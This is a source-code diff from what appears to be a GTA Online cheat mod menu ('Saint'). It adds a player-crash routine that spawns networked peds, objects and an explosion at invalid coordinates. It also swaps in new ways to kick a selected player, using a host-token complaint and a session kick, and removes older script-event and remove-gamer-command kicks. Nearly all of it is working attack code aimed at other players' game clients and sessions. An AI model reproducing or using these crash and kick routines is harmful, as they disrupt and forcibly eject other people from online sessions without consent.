@@ -26,9 +26,9 @@ namespace Saint {
 			ENTITY::DELETE_ENTITY(&ent);
 			OBJECT::DELETE_OBJECT(&ent);
 		}
-		const char* Menu[3]
+		const char* Menu[2]
 		{
-			"Kiddions", "Kiddions 2", "Desync"
+			"Kiddions", "Desync"
 		};
 
 		std::size_t Menu_Data = 0;
@@ -91,7 +91,27 @@ namespace Saint {
 				g_GameFunctions->m_trigger_script_event(1, Args3, sizeof(Args3) / sizeof(Args3[0]), 1 << g_SelectedPlayer);
 			}
 			if (Menu_DataCrash == 1) {
-				WEAPON::REMOVE_WEAPON_FROM_PED(PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(g_SelectedPlayer), 0xA2719263);
+				Ped ped1 = PED::CREATE_PED(26, MISC::GET_HASH_KEY("a_c_poodle"), 0x796e, 0x796e, 0x796e, 1, 1, 0);
+				Ped ped2 = PED::CREATE_PED(21, MISC::GET_HASH_KEY("a_c_poodle"), 0x796e, 0x796e, 0x796e, 1, 1, 0);
+				Player You = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(PLAYER::PLAYER_PED_ID());
+				Object OBJ1 = OBJECT::CREATE_OBJECT(0xC6899CDE, 0x796e, 0x796e, 0x796e, true, false, false);
+				ENTITY::ATTACH_ENTITY_TO_ENTITY(ped1, You, 0x796e, 0x796e, 0x796e, 0x796e, 0, 0, 1, false, false, true, true, 0, false, false);
+				ENTITY::ATTACH_ENTITY_TO_ENTITY(ped2, You, 0x796e, 0x796e, 0x796e, 0x796e, 0, 0, 1, false, false, true, true, 0, false, false);
+				ENTITY::ATTACH_ENTITY_TO_ENTITY(OBJ1, You, 0x796e, 0x796e, 0x796e, 0x796e, 0, 0, 1, false, false, true, true, 0, false, false);
+				WEAPON::GIVE_WEAPON_TO_PED(ped1, MISC::GET_HASH_KEY("weapon_machete"), 1, false, true);
+				WEAPON::GIVE_WEAPON_TO_PED(ped2, MISC::GET_HASH_KEY("weapon_machete"), 1, false, true);
+				WEAPON::SET_CURRENT_PED_WEAPON(ped1, -581044007, true);
+				WEAPON::SET_CURRENT_PED_WEAPON(ped2, -581044007, true);
+				FIRE::ADD_EXPLOSION(0x796e, 0x796e, 0x796e, 1, 100, false, true, false, false);
+				const auto NID1 = NETWORK::NET_TO_ENT(ped1);
+				NETWORK::NETWORK_GET_ENTITY_IS_NETWORKED(ped1);
+				NETWORK::SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NID1, TRUE);
+				const auto NID2 = NETWORK::NET_TO_ENT(ped2);
+				NETWORK::NETWORK_GET_ENTITY_IS_NETWORKED(ped2);
+				NETWORK::SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NID2, TRUE);
+				const auto NID3 = NETWORK::NET_TO_OBJ(OBJ1);
+				NETWORK::NETWORK_GET_ENTITY_IS_NETWORKED(OBJ1);
+				NETWORK::SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NID3, TRUE);
 			}
 			if (Menu_DataCrash == 2) {
 				auto Ped = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(g_SelectedPlayer);
@@ -183,22 +203,6 @@ namespace Saint {
 				m_queue.add(18s, "Removing player..", [] {});
 			}
 			if (pos == 1) {
-				g_FiberPool.queue([]
-					{
-						const size_t arg_count = 3;
-				int64_t args[arg_count] =
-				{
-					(int64_t)1674887089,
-					(int64_t)PLAYER::PLAYER_ID(),
-					*script_global(1892703).at(g_GameVariables->m_net_game_player(g_SelectedPlayer)->m_player_id, 599).at(510).as<int64_t*>()
-				};
-
-				g_GameFunctions->m_trigger_script_event(1, args, arg_count, 1 << g_GameVariables->m_net_game_player(g_SelectedPlayer)->m_player_id);
-					});
-
-				m_queue.add(18s, "Removing player..", [] {});
-			}
-			if (pos == 2) {
 				if (std::chrono::system_clock::now() - last < 10s)
 				{
 					return;
@@ -229,69 +233,12 @@ namespace Saint {
 				WEAPON::REMOVE_ALL_PED_WEAPONS(PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(target->m_player_id), FALSE);
 				PlayerManager->UpdatePlayerListsForPlayer(LocalPlayer);
 			}
+			if (pos == 2) {
+				get_network()->m_game_complaint_mgr.raise_complaint(g_GameFunctions->m_GetNetPlayer(g_SelectedPlayer)->get_net_data()->m_host_token);
+				m_player_to_use_complaint_kick = g_GameFunctions->m_GetNetPlayer(g_SelectedPlayer);
+			}
 			if (pos == 3) {
-				auto PlayerManager = GetNetworkPlayerMgr();
-				auto target = g_GameFunctions->m_GetNetPlayer(g_SelectedPlayer);
-				if (PlayerManager == nullptr) {
-					return;
-				}
-				auto LocalPlayer = PlayerManager->m_local_net_player;
-				if (LocalPlayer == nullptr) {
-					return;
-				}
-				if (target == nullptr) {
-					return;
-				}
-				if (target == LocalPlayer) {
-					return;
-				}
-
-				rage::snMsgRemoveGamersFromSessionCmd cmd{};
-				cmd.m_session_id = get_network()->m_game_session_ptr->m_rline_session.m_session_id;
-				cmd.m_num_peers = 1;
-				cmd.m_peer_ids[0] = get_session_peer(target)->m_peer_data.m_peer_id_2;
-
-				
-
-				if (get_network()->m_game_session.is_host())
-				{
-					g_GameFunctions->m_handle_remove_gamer_cmd(get_network()->m_game_session_ptr, GetSessionPlayer(target), &cmd);
-				}
-				else if (target->is_host())
-				{
-					for (auto Player : PlayerManager->m_player_list)
-					{
-						if (Player != nullptr)
-						{
-							if (Player->is_valid())
-							{
-								if (Player->m_player_id != target->m_player_id)
-								{
-									g_GameFunctions->m_send_remove_gamer_cmd(get_network()->m_game_session_ptr->m_net_connection_mgr,
-										g_GameFunctions->m_get_connection_peer(get_network()->m_game_session_ptr->m_net_connection_mgr, (int)GetSessionPlayer(Player)->m_player_data.m_peer_id_2),
-										get_network()->m_game_session_ptr->m_connection_identifier, &cmd, 0x1000000);
-								}
-							}
-						}
-					}
-
-					g_GameFunctions->m_handle_remove_gamer_cmd(get_network()->m_game_session_ptr, GetSessionPlayer(target), &cmd);
-				}
-				else
-				{
-					for (auto Player : PlayerManager->m_player_list)
-					{
-						if (Player != nullptr)
-						{
-							if (Player->is_host())
-							{
-								g_GameFunctions->m_send_remove_gamer_cmd(get_network()->m_game_session_ptr->m_net_connection_mgr,
-									g_GameFunctions->m_get_connection_peer(get_network()->m_game_session_ptr->m_net_connection_mgr, (int)GetSessionPlayer(Player)->m_player_data.m_peer_id_2),
-									get_network()->m_game_session_ptr->m_connection_identifier, &cmd, 0x1000000);
-							}
-						}
-					}
-				}
+				NETWORK::NETWORK_SESSION_KICK_PLAYER(all_players.get_id(g_SelectedPlayer));
 
 				
 
